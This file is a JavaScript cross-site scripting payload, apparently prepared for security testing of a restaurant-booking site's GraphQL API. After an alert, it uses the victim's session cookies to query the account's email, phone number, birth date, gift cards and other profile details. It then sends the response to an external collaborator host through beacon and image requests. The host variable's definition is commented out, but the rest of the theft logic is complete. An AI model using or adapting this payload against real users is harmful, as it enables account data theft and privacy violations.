alert('xss argentuml');

//var COLLAB = 'https://9s2mih6vfcvkogr4v94edwuj1a71vvjk.oastify.com';

function exfil(tag, data) {
  try { navigator.sendBeacon(COLLAB + '/?t=' + tag, String(data)); } catch (e) {}
  try { new Image().src = COLLAB + '/?t=' + tag + '&d=' + encodeURIComponent(String(data).slice(0, 1400)); } catch (e) {}
}

function gql(ops) {
  return fetch('/api/graphql', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/json',
      'X-Thefork-Product-Id': '37',
      'X-Thefork-Product-Name': 'core-front-browser',
      'Timezone': 'Europe/Paris',
      'Apollographql-Client-Name': 'core-front-browser'
    },
    body: JSON.stringify(ops)
  }).then(function (r) { return r.text(); });
}

var ME_QUERY = 'query Me {\n  me {\n    id\n    legacyId\n    email\n    firstName\n    lastName\n    avatarUrl\n    birthDate\n    gender\n    hasPassword\n    phone\n    totalYumsEarned\n    totalYumsBurned\n    totalReservation\n    hasBookmark\n    hasReservation\n    createdAt\n    hasCompletedBookmarksOnboarding\n    highestEligibleDiscountCode {\n      amount {\n        currency {\n          decimalPosition\n          isoCurrency\n          __typename\n        }\n        value\n        __typename\n      }\n      __typename\n    }\n    gamification {\n      name\n      __typename\n    }\n    giftCards {\n      id\n      status\n      __typename\n    }\n    phoneConfirmed\n    stats {\n      segment\n      __typename\n    }\n    __typename\n  }\n  connectionStatus\n  customerOptIn {\n    id\n    optIn {\n      id\n      optInId\n      type\n      active\n      status\n      __typename\n    }\n    __typename\n  }\n}';

var OPS = [{
  operationName: 'Me',
  variables: {},
  extensions: { clientLibrary: { name: '@apollo/client', version: '4.2.7' } },
  query: ME_QUERY
}];

gql(OPS)
  .then(function (res) { exfil('me', res); })
  .catch(function (e) { exfil('me_err', e.message); })
